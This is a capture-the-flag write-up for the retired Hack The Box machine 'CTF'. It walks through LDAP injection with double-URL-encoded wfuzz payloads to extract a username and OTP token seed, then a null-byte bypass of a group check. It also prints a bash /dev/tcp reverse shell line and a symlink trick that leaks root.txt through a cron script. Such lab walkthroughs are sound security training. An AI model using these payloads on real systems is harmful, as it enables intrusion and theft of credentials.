# CTF

This is the write-up for the box CTF that got retired at the 20th July 2019.
My IP address was 10.10.14.91 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.122    ctf.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/ctf.nmap 10.10.10.122
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)
|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)
|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
|_http-title: CTF
```

## Checking HTTP (Port 80)

On the webpage we get a text that says the following:
> As part of our SDLC, we need to validate a proposed authentication technology, based on software token, with a penetration test.
Please login to do your test.
This server is pretected against some kind of threats, for instance, bruteforcing.
[...]
A list of banned IP is available here...

If we click on _here_ we get the output of a _top_ command and a list of banned IPs. This information is not interesting, so we get to the _Login_ part of the page.

We are greeted with an input for an **Username** and an **OTP**. If we input a non valid user we get the message _User test not found_.
When testing for special characters with _Burpsuite_ by URL encoding strings multiple times, we get only one time URL encoded strings. This means there is some kind of blacklist in the background.

If we check the source-code of the login page we get a hint that says:
> at the moment we have choosen an already existing attribute in order to store the token string (81 digits)

After some research on the internet for **Software Token Linux** we get to the conclusion that the software [stoken](https://www.systutorials.com/docs/linux/man/1-stoken/) was used.
On that page you can find that the numeric string is **81 digits**, just like the hint told us.
And the box name **CTF** stands for _compressed token format_.
Now we know that we will use this software for this token but first we need to enumerate usernames.

### Enumerating usernames

Bruteforcing / Extensive Fuzzing won't help us as this will get us on a blacklist, so we need another way.
But we need to fuzz a little bit anyway.
Fuzzing for some usernames doesn't get us any results and fuzzing for special characters neither because of the blacklist we found about earlier.

As double URL encoded characters get us different responses, we will fuzz for that with the wordlist from _Seclists_ **doble-uri-hex.txt**.
In this wordlist there are all 256 ASCII characters but double URL encoded.

Short explanation of double URL encoding
>This is the double URL encoded character for **A**:
%2541

>An application decodes %25 first (thats **%**) and then we are left with **%41**.
This will be decoded after and then we are left with **A**

The command with _wfuzz_ looks like this:
```markdown
wfuzz --hw 233 -d 'inputUsername=FUZZ&inputOTP=1234' -w doble-uri-hex.txt hxxp://10.10.10.122/login.php
```

The results are:
- %2500 = Null Byte
- %2528 = (
- %2529 = )
- %252a = *
- %255c = \

Looking at these characters it becomes clear that these are used in **LDAP queries**!

#### Creating an LDAP query

We will manually create an LDAP query and test it with Burpsuite as a proxy.
First we need to need to check when the query is successful. After a little bit of trying, we find out that 3 closed parentheses after the username gives us a different result:

```markdown
inputUsername=Testman%2529%2529%2529%2500&inputOTP=1234

URL-encoded:
inputUsername=Testman)))&inputOTP=1234
```

We can imagine the query looks like this now:
```markdown
(&
  (&
    (password=testpass)
    (uid=Testman)))
  )
  (|
    (compare something)
  )
)
```

Now we kind of know the structure how it could look like, so lets see what happens on a wildcard character:

```markdown
inputUsername=%252a&inputOTP=1234

URL-encoded:
inputUsername=*&inputOTP=1234
```

By requesting this we get **Cannot Login** on the webpage instead of **User test not found**. This means we can find a valid username letter by letter by Fuzzing.

In _Seclists_ the wordlist _char.txt_ has every character of the alphabet and that is what we need for the next Fuzzing task.
The Wfuzz command looks like this:
```markdown
wfuzz --hw 233 -d 'inputUsername=FUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
```

This goes through the wordlist and gives us the result which letter is valid in front of a wildcard. In this case it just gave the letter **l**.
Now lets fuzz the next letter:
```markdown
wfuzz --hw 233 -d 'inputUsername=lFUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
> Output: d

wfuzz --hw 233 -d 'inputUsername=ldFUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
> Output: a

wfuzz --hw 233 -d 'inputUsername=ldaFUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
> Output: p

wfuzz --hw 233 -d 'inputUsername=ldapFUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
> Output: u
...
```

If we do this until Wfuzz doesn't give us any output we get the username **ldapuser**!

#### Getting the attributes of the user

Now that we have the user, we need the attributes to enumerate further. Our LDAP query need to look like this:
```markdown
(&
  (&
    (password=testpass)
    (uid=ldapuser)))
    ($attribute=*
  )
  (|
    (compare something)
  )
)
```

There are some default LDAP attributes we know of that we are going to check. There is a nice list on the repository [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt) that we are going to use.

We want to fuzz for the attributes like this:
```markdown
ldapuser%2529%2528FUZZ%253d%252a

URL-encoded:
ldapuser)(FUZZ=*
```

The Wfuzz command looks like this:
```markdown
wfuzz --hw 233 -d 'inputUsername=ldapuser%2529%2528FUZZ%253d%252a&inputOTP=1234' -w LDAP_attributes.txt hxxp://10.10.10.122/login.php
```

This gives us all the valid attributes:
> commonName, cn, mail, name, pager, objectClass, uid, userPassword, sn, surname

### Getting the OTP

As we are looking for the 81-digit token right now, we should enumerate the value of that attribute with Wfuzz like we enumerated the username. The only attribute that makes sense for a 81 digit number is **pager**.

Now our LDAP query looks like this:
```markdown
(&
  (&
    (password=testpass)
    (uid=ldapuser)))
    (pager=<81 digits>
  )
  (|
    (compare something)
  )
)
```

We will use the same technique as how we enumerated the username, but as this is 81 digits, we will automate that process by writing a script. The script is in this repository and is called _fuzztoken.py_.

After executing the script we get the 81-digit token:
> 285449490011357156531651545652335570713167411445727140604172141456711102716717000

With this token we can create the OTP with the tool _stoken_ that we found out earlier.
```markdown
apt install stoken

stoken --token=85449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000
```

This command gives us an OTP that can be used to log in on the webpage with the user ldapuser!

> If this does not work, beware that your local time has to be synched with the time of the server. The time of the server can be found in the POST response header field _Date_.

### Logged in as ldapuser

Now we logged in with ldapuser and the OTP, we get a new field named **Cmd**. After trying _whoami_ we get following response:
> User must be member of root or adm group and have a registered token to issue commands on this server

Remember the LDAP query where it does another check after the user attributes. The second check is probably looking for the group membership. We can bypass that by putting a NULL BYTE character after logging in, so our new LDAP query would look like this:
```markdown
(&
  (&
    (password=testpass)
    (uid=ldapuser)))%00
  )
  (|
    (group=adm)
    (group=root)
  )
)
```

So we need to go back and log in like this:
```markdown
ldapuser%2529%2529%2529%2500

URL-encoded:
ldapuser)))%00
```

With this trick the query will ignore the second check if ldapuser is a member of adm or root and the command execution works!

We get a reverse shell with this command and listening on port 443:
```markdown
bash -c 'bash -i >& /dev/tcp/10.10.14.91/443 0>&1'
```

## Privilege Escalation

The shell logs us in as the user _apache_. Looking through the files for the webpage, the file _login.php_ contains the password of ldapuser in cleartext.
> ldapuser:e398e27d5c4ad45086fe431120932a01

We can log in with SSH with these credentials and escalated to the ldapuser and can read **user.txt**.

After enumerating the file system we find the folder _/backup_ and in there the files _honeypot.sh_ and _error.log_.
This bash script handles banned users and there is a line that reads something out of root.txt. On one line it does something in the path _/var/www/html/uploads_ and the _apache_ user has the permission to create files there.

With the apache user we do the following:
```markdown
touch @Test
ln -s /root/root.txt /var/www/html/uploads/Test
```

With the ldapuser this:
```markdown
tail -f /backup/error.log
```

What this does is, the script that executes every minute reads the list file (@Test) and goes into it to read the contents of that. Every line that does not exist will be written to the error.log that we continuously view it with the ldapuser.
> If it did not work, you missed the time frame and have to repeat that process again.

So the error.log will give us the content of root.txt!
